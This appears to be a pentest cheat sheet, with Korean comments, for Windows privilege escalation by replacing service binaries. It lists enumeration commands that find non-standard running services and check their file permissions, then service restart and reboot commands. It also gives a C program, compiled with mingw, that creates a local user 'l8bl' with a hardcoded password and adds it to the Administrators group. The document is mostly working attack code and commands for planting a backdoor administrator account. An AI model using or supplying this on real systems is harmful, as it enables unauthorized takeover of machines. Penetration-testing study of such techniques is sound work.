### Enum
```powershell
# 실행중인 바이너리 조회
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
# 실행 중인 비표준 바이너리만 조회 (cmd)
wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\"
# 실행 중인 비표준 바이너리만 조회 (powershell)
Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where { $_.PathName -notlike "C:\Windows*" } | select Name,DisplayName,StartMode,PathName
# StartMode 조회 (Auto 면 재부팅 이후 자동 실행)
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
# 바이너리 권한 조회
icacls "C:\xampp\apache\bin\httpd.exe"

```

### Exploit
```powershell
# 재시작 가능한지 확인
net start mysql
net stop mysql
sc stop mysql
sc start mysql
sc.exe stop mysql
sc.exe start mysql
# 컴퓨터 재부팅 (SeShutdownPrivilege)
shutdown /r /t 0
```
#### adduser.c
```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user l8bl l8bl123 /add");
  i = system ("net localgroup administrators l8bl /add");
  
  return 0;
}
```
#### Compile
```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```
